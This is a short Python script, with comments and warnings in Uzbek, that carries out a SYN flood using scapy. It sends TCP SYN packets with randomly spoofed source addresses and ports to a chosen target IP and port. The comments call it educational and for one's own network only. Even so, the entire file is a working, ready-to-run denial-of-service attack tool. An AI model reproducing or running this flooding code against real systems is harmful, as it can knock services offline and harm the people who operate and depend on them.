#!/usr/bin/env python3
"""
SYN Flood - FAQAT TA'LM UCHUN!
Faqat o'z tarmog'ingizda sinang!
Ruxsatsiz ishlatish JINOYAT!
"""

from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port, count=100):
    """
    SYN Flood simulyatsiya
    
    ⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!
    """
    print(f"⚠️  SYN Flood: {target_ip}:{target_port}")
    print(f"[*] {count} ta SYN paket")
    print("⚠️  CTRL+C to'xtatish\n")
    
    sent = 0
    for i in range(count):
        try:
            # Tasodifiy manzil
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}."
            src_ip += f"{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            # SYN paket (flags="S")
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags="S")
            
            send(ip/tcp, verbose=False)
            sent += 1
            
            if sent % 20 == 0:
                print(f"[*] Sent: {sent}/{count}")
                
        except KeyboardInterrupt:
            break
    
    print(f"\n[*] Tugadi: {sent} paket yuborildi")

if __name__ == "__main__":
    # ⚠️  FAQAT O'Z TARMOG'INGIZNI ISHLATING!
    TARGET = "192.168.1.100"  # Target server IP
    PORT = 80                 # HTTP port
    COUNT = 50                # Paket soni
    
    syn_flood(TARGET, PORT, COUNT)
